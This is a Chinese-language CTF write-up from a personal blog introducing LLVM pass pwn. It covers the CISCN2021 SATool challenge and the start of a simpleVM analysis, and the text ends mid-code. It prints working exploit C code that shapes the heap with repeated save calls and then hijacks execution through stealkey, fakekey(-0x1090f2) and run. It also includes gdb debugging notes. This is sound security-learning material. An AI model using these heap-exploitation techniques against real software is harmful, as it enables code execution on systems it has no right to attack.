<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  <meta name="baidu-site-verification" content="codeva-0Qx7wvY9gP" />
  <meta name="msvalidate.01" content="FB02A8AFF2CE6EF90657A5C51EA59F68" />
  
  <title>llvm pass pwn 入门 | C_LBY&#39;s BLOG</title>
  <meta name="author" content="鎏柏鱼">
  
  <meta name="description" content="llvm pass pwn 入门">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="llvm pass pwn 入门"/>
  <meta property="og:site_name" content="C_LBY&#39;s BLOG"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="C_LBY&#39;s BLOG" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">C_LBY&#39;s BLOG</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/diary" title="fashion little junk">
			  <i class="fa fa-tasks"></i>Diary
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> llvm pass pwn 入门</h1>
		</div>
	



	<div class="row post">
		<!-- cols -->
		
			<div id="top_meta"></div>
			<div class="col-md-9">
				

							<!-- content -->
							<div class="mypage">
								
									<div class="alert alert-success description">
										<i class="fa fa-info-circle"></i> llvm pass pwn 入门
									</div> <!-- alert -->
									

										<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>本来在前段时间学会protobuf逆向之后，想着直接又去学习llvm pass pwn，然后发现，看不懂（悲）。近段时间刚好在啃编译原理的龙书，掌握了一些概念和理论，又回到这里来，才终于能看懂并且开始复现一些简单的题目。入门学习的资料有两个，一个是<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125699994">C0lin师傅</a>的，一个是<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/krgZmUWWpO3ajGGwYPzKdw">返璞归真师傅</a>的。</p>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>其实环境安装在返璞归真师傅的文章里有讲到，我这里记录一些他没提到的问题和常用的东西。</p>
<p>有些远古题目比如2021年的题用的llvm-8来出的，那我们就需要安装clang-8。但是，ubuntu22下apt安装并不能安装这个版本的clang，用<code>sudo apt search clang</code>可以验证，是找不到这个版本的，但是ubuntu20下就能够成功安装。相同版本的clang在不同版本的libc下可能会有不同的表现，具体可能表现在堆布局等方面。问就是复现的时候发现有不一样的地方。</p>
<p>各种格式相互转换的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure>

<p>本地验证攻击脚本的命令(以simpleVM为例)：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./opt -load ./VMPass.so -VMPass exp.ll</span><br><span class="line"></span><br><span class="line">./opt -load ./xxx.so -xxx ./exp.&#123;ll/bc&#125;</span><br></pre></td></tr></table></figure>

<h2 id="概念相关"><a href="#概念相关" class="headerlink" title="概念相关"></a>概念相关</h2><p>我这里记录补充一些我自己的发现或者理解。</p>
<p>opt是一个用来对IR代码进行优化分析的程序，它有内置的优化级别，是可以直接使用的，比如<code>opt -O3 input.ll -o output.ll</code>意思是进行O3级别的优化。这个优化的方法和方式，是可以通过加载模块来实现自定义的。题目中给出来的.so文件就是我们所说的模块。在查llvm资料的时候经常能看到的一个说法是“写一个pass”，这个所谓的pass指的就是自定义模块。pass的类型可以分成function pass、module pass、loop pass等，目前CTF中常见的是function pass，也就是对于特定函数的优化分析。一般题目会给出opt，可以用来查询llvm的版本。</p>
<p>自定义模块并不是opt一开始执行就加载进来了的，他是在main函数中通过一个函数加载进来的，这个函数的完整名称（包含类名）是<code>llvm::cl::ParseCommandLineOptions</code>。所以一开始断点就可以直接断在这个函数上，这个函数执行完之后，就可以断点在runOnFunction上了。</p>
<p>自定义模块如果要对特定单个函数（function pass）进行优化，那么一定会继承llvm原本的FunctionPass类，重写<code>runOnFunction</code>函数，他的完整名称叫<code>llvm::FPPassManager::runOnFunction</code>。签名是<code>virtual bool runOnFunction(Function &amp;F) = 0;</code>所以调用它的函数应该是个大循环，将.ll文件中的函数一个一个传进去去进行优化分析。</p>
<p>有些题目会把runonfunction的符号去掉，我们可以在程序的虚表，也就是.data.rel.ro段的最后一个函数找到他。</p>
<h2 id="CISCN2021-SATool-复现"><a href="#CISCN2021-SATool-复现" class="headerlink" title="CISCN2021 SATool(复现)"></a>CISCN2021 SATool(复现)</h2><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>这道题C0lin师傅讲的很详细了，网上也有其他题解。尽管如此，我在复现的时候还是遇到了一些问题。这里先把问题放出来：</p>
<ol>
<li>写出来的exp.c如果转成.ll可以成功攻击，但是如果是转成exp.bc就会段错误。这个问题我还没找到原因和解决方案。</li>
</ol>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>调试环境是ubuntu20。解题思路不再赘述，下面的分析用一个可以打通的脚本去进行调试，并且基于已经知道了解题思路的前提。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>clang-8 -emit-llvm -S exp.c -o exp.ll</code>首先生成.ll文件，然后<code>gdb opt</code>启动调试。第一件事先在<code>llvm::cl::ParseCommandLineOptions</code>下断点，查看backtrace可以看到执行完这个函数之后会返回到0x4b8d65，我们在这里也下一个断点。</p>
<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E5%89%8D.png" alt="satool-模块加载前"></p>
<p>回到main函数之后，此时自定义模块已经被加载进程序里了，可以给runOnFunction下断点了<code>b llvm::FPPassManager::runOnFunction</code>。这时候opt就会开始逐个将我们exp中出现的函数传入runOnFunction进行处理。如果此时给<code>llvm::Value::getName</code>也断点，查看现在正在处理的函数，刚好是按照我们exp中的顺序的。也就意味这我们需要跳四次runOnFunction才会来到对backdoor的处理。</p>
<p>在刚刚跳断点的时候我留了个心眼，我在每次跳完之后都查看了一下bins的情况，发现在开始遍历之前0x20的tcache中只有一个chunk。但是往后每一次断点，都是七个chunk。这和exp里的七次save就对上了。</p>
<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AAchunk.png" alt="satool-只有一个chunk"></p>
<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E4%B8%83%E4%B8%AAchunk.png" alt="satool-七个chunk"></p>
<p>顺带一提，取unsortedbin的那次save，不用写\x00也是可以的，直接留空””，或者写0，效果是一样的。</p>
<h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>题目可以打通了，然后我突发奇想，把exp改了一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把函数定义改成了声明，然后就打不通了。然后按照上面的方法断点，调试，发现只运行了一次runOnFunction然后程序就会报错了。再次调试，这次一直在单步尝试找出报错的函数，运行到getName函数的时候发现它处理的竟然是backdoor函数，也就是说那些声明并没有被传入runOnFunction。所以可以直接得出函数声明不会被当作函数处理吗？事情可能没有这么简单，我们需要进行一些验证。</p>
<p>首先我想到了，去查看一下.ll文件，看能不能找到一些头绪。为了防止exp运行报错，我将其缩减了一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其对应的exp.ll长这样：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; <span class="type">ModuleID</span> = &#x27;exq.c&#x27;</span><br><span class="line"><span class="title">source_filename</span> = <span class="string">&quot;exq.c&quot;</span></span><br><span class="line"><span class="title">target</span> datalayout = <span class="string">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line"><span class="title">target</span> triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [<span class="number">9</span> x i8] c<span class="string">&quot;deadbeef\00&quot;</span>, align <span class="number">1</span></span><br><span class="line"></span><br><span class="line">; <span class="type">Function</span> <span class="type">Attrs</span>: noinline nounwind optnone uwtable</span><br><span class="line"><span class="title">define</span> dso_local i32 @<span class="type">B4ckDo0r</span>() #<span class="number">0</span> &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([<span class="number">9</span> x i8], [<span class="number">9</span> x i8]* @.str, i32 <span class="number">0</span>, i32 <span class="number">0</span>), i8* getelementptr inbounds ([<span class="number">9</span> x i8], [<span class="number">9</span> x i8]* @.str, i32 <span class="number">0</span>, i32 <span class="number">0</span>))</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">declare</span> dso_local void @save(i8*, i8*) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="title">attributes</span> #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"><span class="title">attributes</span> #<span class="number">1</span> = &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现，有定义的函数前的指令是define，然后函数声明的指令是declare，并且顺序被放到了后面。所以我们需要调试观察其是否会被传入到runOnFunction。结果就是，依然只执行了一次，这就意味着，declare类型的操作数确实并不会被当作函数处理。</p>
<p>那么，在simpleVM那道题里，exp中函数写成声明一样可以打通，那么这道题应该也有办法的。前面我们说过，在调用runOnFunction前，0x20的tcache中只有一个chunk，那是不是意味着，我们只需要save两次就够了？实践出真知。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E5%A3%B0%E6%98%8E%E5%8F%AF%E6%89%93%E9%80%9A.png" alt="satool-声明可打通"></p>
<h2 id="RedHat2021-simpleVM-复现"><a href="#RedHat2021-simpleVM-复现" class="headerlink" title="RedHat2021 simpleVM(复现)"></a>RedHat2021 simpleVM(复现)</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先现在函数表里找到占据位置较大的函数，确定runOnFunction函数是sub_6830。</p>
<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/%E7%A1%AE%E5%AE%9Arunonfunction%E4%BD%8D%E7%BD%AE.png" alt="确定runonfunction位置"></p>
<p>但是这个函数实在有些蹊跷，伪代码展现出来的东西逻辑非常奇怪</p>
<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/simpleVM-runonfunction.png" alt="simpleVM-runonfunction"></p>
<p>但是可以大致推测一下大概意思就是如果函数名为<code>o0o0o0o0</code>就会进入到sub_6AC0，显然这个函数是核心逻辑所在。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::begin(a2);<span class="comment">//将第一个基本块的迭代器赋值给v5</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::end(a2);<span class="comment">//结束迭代器赋值给v4</span></span><br><span class="line">    <span class="keyword">if</span> ( (llvm::operator!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )<span class="comment">//如果&amp;v4 v5相等，说明遍历完成，跳出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//将v3指向当前基本块</span></span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator*(v5);</span><br><span class="line">    sub_6B80(a1, v3);<span class="comment">//传入v3执行函数</span></span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);<span class="comment">//更新v5移动到下一个基本块</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数调用了一个sub_6B80函数，并且传入了一个llvm::BasicBlock类型参数。这段代码干的事情，其实就是遍历了<code>o0o0o0o0</code>函数中的所有基本块（代码块），然后依次将这些基本块传入到sub_6B80中执行。跟进函数。进去之后可以发现其实里面的主逻辑和刚刚分析的是一样的，也是以基本块为单位去逐个进行判断。只不过这次就不是传参后执行函数了，而是直接进行匹配了。我们先来看开始循环之后程序干了什么事情。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">0x37</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">  <span class="keyword">if</span> ( v35 )</span><br><span class="line">  &#123;</span><br><span class="line">    s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">    Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class="line">    *(_QWORD 